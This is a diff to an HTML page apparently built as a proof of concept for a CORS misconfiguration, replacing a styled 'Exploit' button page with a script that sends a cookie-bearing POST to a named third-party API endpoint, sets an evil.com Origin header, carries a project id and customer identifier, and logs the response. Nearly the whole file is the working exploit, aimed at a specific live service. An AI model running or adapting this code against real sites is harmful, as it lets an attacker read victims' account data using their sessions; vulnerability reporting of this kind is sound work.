@@ -2,59 +2,44 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CORS PoC by Vidhan Thakur</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f9;
-            text-align: center;
-            padding: 50px;
-        }
-        h1 {
-            color: #333;
-        }
-        .container {
-            margin-top: 50px;
-        }
-        button {
-            padding: 10px 20px;
-            font-size: 18px;
-            background-color: #4CAF50;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-        button:hover {
-            background-color: #45a049;
-        }
-    </style>
-</head>
-<body>
-    <h1>CORS PoC by Vidhan Thakur</h1>
-    <div class="container">
-        <p>Click the button below to exploit the CORS vulnerability.</p>
-        <button id="exploitButton">Exploit</button>
-    </div>
-
+    <title>CORS Exploit PoC</title>
     <script>
-        document.getElementById('exploitButton').addEventListener('click', function() {
-            // Trigger the CORS exploit when button is clicked
+        function exploit() {
             fetch('https://exponea-api.alshaya.com/bulk', {
-                method: 'GET',
-                credentials: 'include' // Send cookies with the request
+                method: 'POST',
+                credentials: 'include',
+                headers: {
+                    'Content-Type': 'text/plain;charset=UTF-8',
+                    'Origin': 'https://evil.com'
+                },
+                body: JSON.stringify({
+                    "sdk": "js-client",
+                    "sdk_version": "v3.27.0",
+                    "sdk_snippet_version": "v1.0.0",
+                    "commands": [{
+                        "name": "system/ids",
+                        "data": {
+                            "project_id": "78e50322-2007-11ea-9428-62206df291c3",
+                            "customer": {
+                                "google_analytics": "1679285112.1728728817"
+                            },
+                            "expires": 1823336817
+                        }
+                    }]
+                })
             })
             .then(response => response.json())
             .then(data => {
-                // Display the result in a popup window
-                const result = JSON.stringify(data, null, 2);
-                alert('CORS Exploit Result: ' + result);
+                console.log('Exploit successful:', data);
             })
-            .catch(error => {
-                alert('Error: ' + error);
-            });
-        });
+            .catch(error => console.error('Error:', error));
+        }
     </script>
+</head>
+<body>
+    <h1>CORS Exploit Demonstration</h1>
+    <button onclick="exploit()">Run Exploit</button>
 </body>
 </html>
